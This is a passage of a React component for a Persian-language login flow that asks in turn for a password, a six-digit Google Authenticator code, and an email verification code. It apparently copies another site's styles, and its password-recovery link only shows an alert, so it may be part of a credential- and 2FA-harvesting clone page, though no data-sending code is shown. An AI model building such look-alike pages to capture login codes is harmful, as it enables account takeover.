                          textWrap: "nowrap",
                          transitionDuration: "0.05s",
                          transitionProperty: "max-width",
                          transitionTimingFunction:
                            "cubic-bezier(0, 0, 0.2, 1)",
                          visibility: "hidden",
                          whiteSpace: "nowrap",
                        }}
                      >
                        <span
                          style={{
                            cursor: "text",
                            display: "inline-block",
                            fontSize: "12px",
                            lineHeight: "21px",
                            opacity: "0",
                            paddingLeft: "5px",
                            paddingRight: "5px",
                            pointerEvents: "none",
                            textAlign: "right",
                            textWrap: "nowrap",
                            whiteSpace: "nowrap",
                          }}
                        >
                          رمز عبور حساب را وارد کنید.
                        </span>
                      </legend>
                    </fieldset>
                  </div>
                  {errors.password && (
                    <p
                      style={{
                        color: "rgb(220, 38, 38)",
                        fontSize: "12px",
                        textAlign: "right",
                        marginTop: "4px",
                      }}
                    >
                      {errors.password}
                    </p>
                  )}
                </div>

                {/* Forgot Password Link */}
                <div
                  style={{
                    display: "flex",
                    gap: "8px",
                    marginBottom: "24px",
                  }}
                >
                  <p
                    style={{
                      fontSize: "14px",
                      lineHeight: "24.01px",
                      margin: "0",
                      color: "rgb(0, 0, 0)",
                    }}
                  >
                    رمز عبور را فراموش کرده‌اید؟
                  </p>
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      alert(
                        "لینک بازیابی رمز عبور به ایمیل شما ارسال خواهد شد.",
                      );
                    }}
                    style={{
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      cursor: "pointer",
                      fontSize: "14px",
                      fontWeight: "500",
                      lineHeight: "24.01px",
                      outlineColor: "rgb(0, 122, 255)",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                      textDecoration: "none",
                    }}
                  >
                    بازیا��ی رمز عبور
                  </a>
                </div>

                {/* Submit Section */}
                <div style={{ marginTop: "16px" }}>
                  <hr
                    style={{
                      borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
                      borderBottomStyle: "solid",
                      borderBottomWidth: "1px",
                      borderColor: "rgba(0, 0, 0, 0.2)",
                      borderLeftStyle: "solid",
                      borderRightStyle: "solid",
                      borderStyle: "solid",
                      borderTopStyle: "solid",
                      flexShrink: "0",
                      marginBottom: "16px",
                      marginLeft: "-20px",
                      marginRight: "-20px",
                      overflowX: "hidden",
                      overflowY: "hidden",
                    }}
                  />
                  <button
                    tabIndex={0}
                    type="submit"
                    disabled={isSubmitting}
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(23, 29, 38)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderColor: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      color: "rgb(255, 255, 255)",
                      cursor: isSubmitting ? "not-allowed" : "pointer",
                      display: "inline-flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      outlineColor: "rgb(255, 255, 255)",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textDecorationColor: "rgb(255, 255, 255)",
                      textEmphasisColor: "rgb(255, 255, 255)",
                      textTransform: "uppercase",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.25s, 0.25s, 0.25s",
                      transitionProperty:
                        "background-color, box-shadow, border-color",
                      transitionTimingFunction:
                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                      border: "none",
                      fontSize: "14px",
                      opacity: isSubmitting ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <Loader2
                          style={{
                            width: "16px",
                            height: "16px",
                            marginLeft: "8px",
                            animation: "spin 1s linear infinite",
                          }}
                        />
                        <span>در حال بررسی...</span>
                      </div>
                    ) : (
                      <>
                        <span
                          style={{
                            borderColor: "rgb(255, 255, 255)",
                            color: "rgb(255, 255, 255)",
                            cursor: "pointer",
                            display: "contents",
                            fontWeight: "500",
                            outlineColor: "rgb(255, 255, 255)",
                            textAlign: "center",
                            textDecorationColor: "rgb(255, 255, 255)",
                            textEmphasisColor: "rgb(255, 255, 255)",
                            textTransform: "uppercase",
                            userSelect: "none",
                          }}
                        />
                        <span>ثبت و ورود به حساب</span>
                        <span
                          style={{
                            borderBottomLeftRadius: "8px",
                            borderBottomRightRadius: "8px",
                            borderColor: "rgb(255, 255, 255)",
                            borderRadius: "8px",
                            borderTopLeftRadius: "8px",
                            borderTopRightRadius: "8px",
                            bottom: "0px",
                            color: "rgb(255, 255, 255)",
                            cursor: "pointer",
                            fontWeight: "500",
                            left: "0px",
                            outlineColor: "rgb(255, 255, 255)",
                            overflowX: "hidden",
                            overflowY: "hidden",
                            pointerEvents: "none",
                            position: "absolute",
                            right: "0px",
                            textAlign: "center",
                            textDecorationColor: "rgb(255, 255, 255)",
                            textEmphasisColor: "rgb(255, 255, 255)",
                            textTransform: "uppercase",
                            top: "0px",
                            userSelect: "none",
                            zIndex: "0",
                          }}
                        />
                      </>
                    )}
                  </button>
                </div>
              </form>
            </>
          )}

          {/* Step 5: Google Authenticator */}
          {currentStep === "google" && (
            <>
              {/* Alert Message */}
              <div
                role="alert"
                style={{
                  backgroundColor: "rgba(0, 122, 255, 0.05)",
                  borderBottomLeftRadius: "8px",
                  borderBottomRightRadius: "8px",
                  borderColor: "rgb(0, 122, 255)",
                  borderRadius: "8px",
                  borderTopLeftRadius: "8px",
                  borderTopRightRadius: "8px",
                  color: "rgb(0, 122, 255)",
                  display: "flex",
                  fontSize: "12px",
                  lineHeight: "20.004px",
                  outlineColor: "rgb(0, 122, 255)",
                  paddingBottom: "16px",
                  paddingLeft: "16px",
                  paddingRight: "16px",
                  paddingTop: "16px",
                  textDecorationColor: "rgb(0, 122, 255)",
                  textEmphasisColor: "rgb(0, 122, 255)",
                  transitionDuration: "0.3s",
                  transitionProperty: "box-shadow",
                  transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                  width: "100%",
                  border: "1px solid rgb(0, 122, 255)",
                }}
              >
                <div
                  style={{
                    borderColor: "rgb(0, 122, 255)",
                    color: "rgb(0, 122, 255)",
                    display: "flex",
                    fontSize: "22px",
                    lineHeight: "36.674px",
                    marginLeft: "8px",
                    opacity: "0.9",
                    outlineColor: "rgb(0, 122, 255)",
                    textDecorationColor: "rgb(0, 122, 255)",
                    textEmphasisColor: "rgb(0, 122, 255)",
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    fill="none"
                    style={{
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      fill: "none",
                      fontSize: "22px",
                      height: "24px",
                      lineHeight: "36.674px",
                      outlineColor: "rgb(0, 122, 255)",
                      overflowClipMargin: "content-box",
                      overflowX: "hidden",
                      overflowY: "hidden",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                      width: "24px",
                    }}
                  >
                    <path
                      fill="currentColor"
                      fillRule="evenodd"
                      d="M12 2.5c-5.238 0-9.5 4.261-9.5 9.5s4.262 9.5 9.5 9.5 9.5-4.262 9.5-9.5-4.262-9.5-9.5-9.5"
                      clipRule="evenodd"
                      opacity="0.2"
                    ></path>
                    <path
                      fill="currentColor"
                      d="M12.747 8.291a.75.75 0 0 0-1.5 0v.063a.75.75 0 0 0 1.5 0zM12.753 11.394a.75.75 0 0 0-1.5 0v4.3a.75.75 0 0 0 1.5 0z"
                    ></path>
                  </svg>
                </div>
                <div
                  style={{
                    borderColor: "rgb(0, 122, 255)",
                    color: "rgb(0, 122, 255)",
                    flexGrow: "1",
                    fontSize: "14px",
                    lineHeight: "24.01px",
                    outlineColor: "rgb(0, 122, 255)",
                    overflowX: "auto",
                    overflowY: "auto",
                    textDecorationColor: "rgb(0, 122, 255)",
                    textEmphasisColor: "rgb(0, 122, 255)",
                  }}
                >
                  <div
                    style={{
                      alignItems: "flex-start",
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      display: "flex",
                      fontSize: "14px",
                      justifyContent: "space-between",
                      lineHeight: "24.01px",
                      outlineColor: "rgb(0, 122, 255)",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                    }}
                  >
                    <div
                      style={{
                        borderColor: "rgb(0, 122, 255)",
                        color: "rgb(0, 122, 255)",
                        fontSize: "14px",
                        lineHeight: "24.01px",
                        outlineColor: "rgb(0, 122, 255)",
                        textDecorationColor: "rgb(0, 122, 255)",
                        textEmphasisColor: "rgb(0, 122, 255)",
                      }}
                    >
                      کد ۶ رقمی Google Authenticator خود را وارد کنید.
                    </div>
                  </div>
                  <div
                    style={{
                      alignItems: "center",
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      display: "flex",
                      fontSize: "14px",
                      lineHeight: "24.01px",
                      outlineColor: "rgb(0, 122, 255)",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                    }}
                  />
                </div>
              </div>

              {/* 6 Separate OTP Inputs */}
              <div
                style={{
                  direction: "ltr",
                  display: "flex",
                  flexFlow: "row wrap",
                  flexWrap: "wrap",
                  marginRight: "-8px",
                  marginTop: "-8px",
                  width: "calc(100% + 8px)",
                }}
              >
                {[0, 1, 2, 3, 4, 5].map((index) => (
                  <div
                    key={index}
                    style={{
                      direction: "ltr",
                      flexBasis: "0px",
                      flexGrow: "1",
                      maxWidth: "100%",
                      paddingRight: "8px",
                      paddingTop: "8px",
                    }}
                  >
                    <div
                      style={{
                        direction: "ltr",
                        display: "inline-flex",
                        flexDirection: "column",
                        flexFlow: "column nowrap",
                        marginBottom: "8px",
                        marginTop: "16px",
                        position: "relative",
                        verticalAlign: "top",
                        width: "100%",
                      }}
                    >
                      <div
                        style={{
                          alignItems: "center",
                          borderBottomLeftRadius: "8px",
                          borderBottomRightRadius: "8px",
                          borderRadius: "8px",
                          borderTopLeftRadius: "8px",
                          borderTopRightRadius: "8px",
                          cursor: "text",
                          direction: "ltr",
                          display: "flex",
                          position: "relative",
                          textAlign: "center",
                          width: "100%",
                        }}
                      >
                        <input
                          aria-invalid="false"
                          type="tel"
                          maxLength={1}
                          value={googleCode[index] || ""}
                          onChange={(e) => {
                            const newValue = e.target.value;
                            if (newValue.match(/^[0-9]*$/)) {
                              const newCode = googleCode.split("");
                              newCode[index] = newValue;
                              setGoogleCode(newCode.join(""));

                              // Auto focus next input
                              if (newValue && index < 5) {
                                const nextInput = document.querySelector(
                                  `input[data-google-index="${index + 1}"]`,
                                ) as HTMLInputElement;
                                if (nextInput) nextInput.focus();
                              }
                            }
                          }}
                          onKeyDown={(e) => {
                            if (
                              e.key === "Backspace" &&
                              !googleCode[index] &&
                              index > 0
                            ) {
                              const prevInput = document.querySelector(
                                `input[data-google-index="${index - 1}"]`,
                              ) as HTMLInputElement;
                              if (prevInput) prevInput.focus();
                            }
                          }}
                          data-google-index={index}
                          disabled={isSubmitting}
                          style={{
                            animation:
                              "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                            animationDuration: "0.01s",
                            animationName: "mui-auto-fill-cancel",
                            appearance: "auto",
                            boxSizing: "content-box",
                            cursor: "text",
                            direction: "ltr",
                            overflowX: "clip",
                            overflowY: "clip",
                            paddingBottom: "10px",
                            paddingLeft: "12px",
                            paddingRight: "12px",
                            paddingTop: "10px",
                            textAlign: "center",
                            width: "100%",
                            border: "none",
                            outline: "none",
                            fontSize: "16px",
                            fontWeight: "500",
                          }}
                        />
                        <fieldset
                          aria-hidden="true"
                          style={{
                            borderBottom: errors.googleCode
                              ? "1px solid rgb(220, 38, 38)"
                              : "1px solid rgba(0, 0, 0, 0.2)",
                            borderBottomLeftRadius: "8px",
                            borderBottomRightRadius: "8px",
                            borderBottomStyle: "solid",
                            borderBottomWidth: "1px",
                            borderColor: errors.googleCode
                              ? "rgb(220, 38, 38)"
                              : "rgba(0, 0, 0, 0.2)",
                            borderLeft: errors.googleCode
                              ? "1px solid rgb(220, 38, 38)"
                              : "1px solid rgba(0, 0, 0, 0.2)",
                            borderLeftStyle: "solid",
                            borderLeftWidth: "1px",
                            borderRadius: "8px",
                            borderRight: errors.googleCode
                              ? "1px solid rgb(220, 38, 38)"
                              : "1px solid rgba(0, 0, 0, 0.2)",
                            borderRightStyle: "solid",
                            borderRightWidth: "1px",
                            borderStyle: "solid",
                            borderTop: errors.googleCode
                              ? "1px solid rgb(220, 38, 38)"
                              : "1px solid rgba(0, 0, 0, 0.2)",
                            borderTopLeftRadius: "8px",
                            borderTopRightRadius: "8px",
                            borderTopStyle: "solid",
                            borderTopWidth: "1px",
                            borderWidth: "1px",
                            bottom: "0px",
                            cursor: "text",
                            direction: "ltr",
                            left: "0px",
                            minWidth: "0%",
                            overflowX: "hidden",
                            overflowY: "hidden",
                            paddingLeft: "8px",
                            paddingRight: "8px",
                            pointerEvents: "none",
                            position: "absolute",
                            right: "0px",
                            textAlign: "right",
                            top: "-5px",
                          }}
                        >
                          <legend
                            style={{
                              cursor: "text",
                              direction: "ltr",
                              lineHeight: "11px",
                              overflowX: "hidden",
                              overflowY: "hidden",
                              pointerEvents: "none",
                              textAlign: "right",
                              transitionDuration: "0.15s",
                              transitionProperty: "width",
                              transitionTimingFunction:
                                "cubic-bezier(0, 0, 0.2, 1)",
                            }}
                          >
                            <span
                              aria-hidden="true"
                              style={{
                                cursor: "text",
                                direction: "ltr",
                                display: "inline",
                                lineHeight: "11px",
                                pointerEvents: "none",
                                textAlign: "right",
                              }}
                            >
                              ​
                            </span>
                          </legend>
                        </fieldset>
                      </div>
                    </div>
                  </div>
                ))}
              </div>

              {errors.googleCode && (
                <p
                  style={{
                    color: "rgb(220, 38, 38)",
                    fontSize: "12px",
                    textAlign: "right",
                    marginTop: "8px",
                  }}
                >
                  {errors.googleCode}
                </p>
              )}

              {/* Submit Button */}
              <div style={{ marginTop: "16px" }}>
                <hr
                  style={{
                    borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
                    borderBottomStyle: "solid",
                    borderBottomWidth: "1px",
                    borderColor: "rgba(0, 0, 0, 0.2)",
                    borderLeftStyle: "solid",
                    borderRightStyle: "solid",
                    borderStyle: "solid",
                    borderTopStyle: "solid",
                    flexShrink: "0",
                    marginBottom: "16px",
                    marginLeft: "-20px",
                    marginRight: "-20px",
                    overflowX: "hidden",
                    overflowY: "hidden",
                  }}
                />
                <button
                  tabIndex={0}
                  type="button"
                  onClick={handleGoogleCodeSubmit}
                  disabled={isSubmitting || googleCode.length !== 6}
                  style={{
                    alignItems: "center",
                    backgroundColor: "rgb(23, 29, 38)",
                    borderBottomLeftRadius: "8px",
                    borderBottomRightRadius: "8px",
                    borderColor: "rgb(255, 255, 255)",
                    borderRadius: "8px",
                    borderTopLeftRadius: "8px",
                    borderTopRightRadius: "8px",
                    color: "rgb(255, 255, 255)",
                    cursor:
                      isSubmitting || googleCode.length !== 6
                        ? "not-allowed"
                        : "pointer",
                    display: "flex",
                    fontWeight: "500",
                    justifyContent: "center",
                    outlineColor: "rgb(255, 255, 255)",
                    paddingBottom: "10px",
                    paddingLeft: "16px",
                    paddingRight: "16px",
                    paddingTop: "10px",
                    position: "relative",
                    textAlign: "center",
                    textDecorationColor: "rgb(255, 255, 255)",
                    textEmphasisColor: "rgb(255, 255, 255)",
                    textTransform: "uppercase",
                    transitionBehavior: "normal, normal, normal",
                    transitionDelay: "0s, 0s, 0s",
                    transitionDuration: "0.25s, 0.25s, 0.25s",
                    transitionProperty:
                      "background-color, box-shadow, border-color",
                    transitionTimingFunction:
                      "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                    userSelect: "none",
                    verticalAlign: "middle",
                    width: "100%",
                    border: "none",
                    fontSize: "14px",
                    opacity:
                      isSubmitting || googleCode.length !== 6 ? "0.5" : "1",
                  }}
                >
                  {isSubmitting ? (
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                      }}
                    >
                      <Loader2
                        style={{
                          width: "16px",
                          height: "16px",
                          marginLeft: "8px",
                          animation: "spin 1s linear infinite",
                        }}
                      />
                      <span>در حال تایید...</span>
                    </div>
                  ) : (
                    <>
                      <span
                        style={{
                          borderColor: "rgb(255, 255, 255)",
                          color: "rgb(255, 255, 255)",
                          cursor: "pointer",
                          display: "contents",
                          fontWeight: "500",
                          outlineColor: "rgb(255, 255, 255)",
                          textAlign: "center",
                          textDecorationColor: "rgb(255, 255, 255)",
                          textEmphasisColor: "rgb(255, 255, 255)",
                          textTransform: "uppercase",
                          userSelect: "none",
                        }}
                      />
                      <span>ثبت و ادامه</span>
                    </>
                  )}
                </button>
              </div>
            </>
          )}

          {/* Step 6: Email Authentication */}
          {currentStep === "email" && emailStep === "email" && (
            <>
              <form onSubmit={handleEmailSubmit}>
                <div style={{ marginBottom: "16px" }}>
                  <AlertMessage>
                    <Mail
                      className="inline ml-2"
                      style={{ width: "16px", height: "16px" }}
                    />
                    ایمیل خود را وارد کنید تا کد تایید برای شما ارسال شود.
                  </AlertMessage>
                </div>

                <div style={{ marginBottom: "16px" }}>
                  <label
                    htmlFor="email-input"
                    style={{
                      fontSize: "14px",
                      fontWeight: "500",
                      marginBottom: "8px",
                      display: "block",
                      textAlign: "right",
                    }}
                  >
                    آدرس ایمیل
                  </label>
                  <Input
                    id="email-input"
                    type="email"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      if (errors.email) {
                        setErrors((prev) => ({ ...prev, email: undefined }));
                      }
                    }}
                    className="w-full text-right"
                    style={{
                      borderRadius: "8px",
                      border: errors.email
                        ? "1px solid rgb(220, 38, 38)"
                        : "1px solid rgba(0, 0, 0, 0.2)",
                      padding: "10px 12px",
                      fontSize: "14px",
                      textAlign: "right",
                      direction: "ltr",
                    }}
                    placeholder="example@email.com"
                    autoFocus
                    disabled={isSubmitting}
                  />
                  {errors.email && (
                    <p
                      style={{
                        color: "rgb(220, 38, 38)",
                        fontSize: "12px",
                        textAlign: "right",
                        marginTop: "4px",
                      }}
                    >
                      {errors.email}
                    </p>
                  )}
                </div>

                <div style={{ marginTop: "16px" }}>
                  <hr
                    style={{
                      borderColor: "rgba(0, 0, 0, 0.2)",
                      marginLeft: "-20px",
                      marginRight: "-20px",
                      marginBottom: "16px",
                    }}
                  />
                  <button
                    type="submit"
                    disabled={isSubmitting}
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(23, 29, 38)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderColor: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      color: "rgb(255, 255, 255)",
                      cursor: isSubmitting ? "not-allowed" : "pointer",
                      display: "inline-flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      outlineColor: "rgb(255, 255, 255)",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textDecorationColor: "rgb(255, 255, 255)",
                      textEmphasisColor: "rgb(255, 255, 255)",
                      textTransform: "uppercase",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.25s, 0.25s, 0.25s",
                      transitionProperty:
                        "background-color, box-shadow, border-color",
                      transitionTimingFunction:
                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                      border: "none",
                      fontSize: "14px",
                      opacity: isSubmitting ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <Loader2
                          style={{
                            width: "16px",
                            height: "16px",
                            marginLeft: "8px",
                            animation: "spin 1s linear infinite",
                          }}
                        />
                        <span>در حال ارسال کد...</span>
                      </div>
                    ) : (
                      "ارسال کد تایید"
                    )}
                  </button>
                </div>
              </form>
            </>
          )}

          {/* Step 7: Email Code Verification */}
          {currentStep === "email" && emailStep === "code" && (
            <>
              <div style={{ marginBottom: "16px" }}>
                <AlertMessage>
                  کد تایید به ایمیل{" "}
                  <strong style={{ direction: "ltr" }}>{email}</strong> ارسال
                  شد.
                </AlertMessage>
              </div>

              <div style={{ marginBottom: "16px" }}>
                <label
                  style={{
                    fontSize: "14px",
                    fontWeight: "500",
                    marginBottom: "8px",
                    display: "block",
                    textAlign: "right",
                  }}
                >
                  کد تایید ایمیل
                </label>
                <OTPInput
                  length={6}
                  value={emailCode}
                  onComplete={setEmailCode}
                  onChange={setEmailCode}
                  disabled={isSubmitting}
                />
                {errors.emailCode && (
                  <p
                    style={{
                      color: "rgb(220, 38, 38)",
                      fontSize: "12px",
                      textAlign: "right",
                      marginTop: "8px",
                    }}
                  >
                    {errors.emailCode}
                  </p>
                )}
              </div>

              <div style={{ marginTop: "24px" }}>
                <hr
                  style={{
                    borderColor: "rgba(0, 0, 0, 0.2)",
                    marginLeft: "-20px",
                    marginRight: "-20px",
                    marginBottom: "16px",
                  }}
                />
                <div style={{ display: "flex", gap: "12px" }}>
                  <Button
                    onClick={() => setEmailStep("email")}
                    variant="outline"
                    className="w-full"
                    style={{
                      border: "1px solid rgba(0, 0, 0, 0.2)",
                      borderRadius: "8px",
                      padding: "10px 16px",
                      fontSize: "14px",
                      fontWeight: "500",
                      textTransform: "uppercase",
                    }}
                  >
                    ویرایش ایمیل
                  </Button>
                  <button
                    onClick={handleEmailCodeSubmit}
                    disabled={isSubmitting || emailCode.length !== 6}
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(23, 29, 38)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderColor: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      color: "rgb(255, 255, 255)",
                      cursor:
                        isSubmitting || emailCode.length !== 6
                          ? "not-allowed"
                          : "pointer",
                      display: "inline-flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      outlineColor: "rgb(255, 255, 255)",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textDecorationColor: "rgb(255, 255, 255)",
                      textEmphasisColor: "rgb(255, 255, 255)",
                      textTransform: "uppercase",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.25s, 0.25s, 0.25s",
                      transitionProperty:
                        "background-color, box-shadow, border-color",
                      transitionTimingFunction:
                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                      border: "none",
                      fontSize: "14px",
                      opacity:
                        isSubmitting || emailCode.length !== 6 ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <Loader2
                          style={{
                            width: "16px",
                            height: "16px",
                            marginLeft: "8px",
                            animation: "spin 1s linear infinite",
                          }}
                        />
                        <span>در حال تایید...</span>
                      </div>
                    ) : (
                      "تایید کد"
                    )}
                  </button>
                </div>
              </div>
            </>
          )}
        </div>
      </div>

      <style jsx>{`
        /* Desktop styles (1024px and up) */
        @media (min-width: 1024px) {
          .form-card {
            border-radius: 16px;
            max-width: 480px;
          }
        }

        /* Mobile and tablet styles (up to 1023px) */
        @media (max-width: 1023px) {
          .form-card {
            border-radius: 0 !important;
            border-top-left-radius: 0 !important;
            border-top-right-radius: 0 !important;
            border-bottom-left-radius: 0 !important;
            border-bottom-right-radius: 0 !important;
            max-width: none !important;
            width: 100vw !important;
            height: 100vh !important;
            min-height: 100vh !important;
            margin: 0 !important;
            display: flex !important;
            flex-direction: column !important;
            justify-content: flex-start !important;
            overflow: hidden !important;
          }
          .form-card > div {
            padding: 20px !important;
            height: 100% !important;
            overflow-y: auto !important;
            display: flex !important;
            flex-direction: column !important;
            justify-content: flex-start !important;
            width: 100% !important;
          }

          /* Ensure body and html don't interfere on mobile */
          body,
          html {
            margin: 0 !important;
            padding: 0 !important;
            overflow-x: hidden !important;
          }
        }

        @keyframes spin {
          0% {
            transform: rotate(0deg);
          }
          100% {
            transform: rotate(360deg);
          }
        }
      `}</style>
    </div>
  );
};
